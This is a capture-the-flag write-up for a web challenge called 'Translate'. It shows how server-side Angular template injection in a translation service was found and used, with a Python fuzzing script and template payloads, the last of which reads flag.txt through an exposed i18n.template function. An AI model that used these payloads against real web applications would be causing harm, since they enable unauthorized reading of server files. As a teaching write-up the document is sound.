# Translate (web 246p, 33 solved)

In the task we get pointed to a webpage which provides a simple translation service.
We know that the flag is in `./flag.txt`.

The service can translate between english and french and we can add new words to the dictionary.
We can also dump the dictionary, which shows that there is an interesting value there.
In one of the translations in the dump there is `{{userQuery}}`, but once we fetch this translation it actually gets changed server-side to our query!

This implies some kind of server-side template injection vulnerability.
We wrote a simple script to simplify fuzzing the templates:

```python
import re
import urllib

import requests

s = requests.session()


def add_exploit(command):
    s.get("http://translate.ctfcompetition.com:1337/add?lang=fr&word=not_found&translated=" + urllib.quote_plus(command))


def check_output():
    data = s.get("http://translate.ctfcompetition.com:1337/?query=dupa&lang=fr").text
    pattern = re.findall('<!----><div ng-if="!i18n.word\(userQuery\)">\s*(.*?)\s*</div><!---->', data, re.DOTALL)
    if len(pattern) == 1:
        return pattern[0]
    else:
        return data


def main():
    while True:
        command = raw_input("> ")
        add_exploit(command)
        print(check_output())
```

It simply adds a new word, and then fetches the "translation".
So if we send `{{1+1}}` we get back `2`.

Fuzzing this a little shows us that this gets evaluated by Angular on the server side somehow.
So we need to inject angular code which will read the flag for us.

Fuzzing the side a bit more, shows that if we try to add a new word to some different language eg. `http://translate.ctfcompetition.com:1337/add?lang=z&word=document&translated=x` it gives error:

```
Error: ENOENT: no such file or directory, open './i18n/z.json'
    at Object.fs.openSync (fs.js:646:18)
    at Object.fs.readFileSync (fs.js:551:33)
    at Object.load (/usr/local/chall/srcs/restricted_fs.js:9:20)
    at app.get (/usr/local/chall/srcs/server.js:158:57)
    at Layer.handle [as handle_request] (/usr/local/chall/node_modules/express/lib/router/layer.js:95:5)
    at next (/usr/local/chall/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/usr/local/chall/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/usr/local/chall/node_modules/express/lib/router/layer.js:95:5)
    at /usr/local/chall/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/usr/local/chall/node_modules/express/lib/router/index.js:335:12)
```

So we know there is some `i18n` module loaded, and we've seen it also in the page output `<div ng-if="!i18n.word\(userQuery\)">`.
We can send `{{i18n}}` and get back `{}`, which means this object is in scope!
We can also call `{{i18n.word('something')}}` to get back translation for given word.

We guessed this object has to load the dictionary somehow, so maybe it could read the flag for us.
So we checked what other methods this object has by sending: `<pre ng-repeat="(key,val) in this.i18n">{{key}} = {{val}}</pre>`

And from this we got only two functions available: `word` which we knew and `template`.
Calling `{{i18n.template('flag.txt')}}` gave back the flag: `CTF{Televersez_vos_exploits_dans_mon_nuagiciel}`

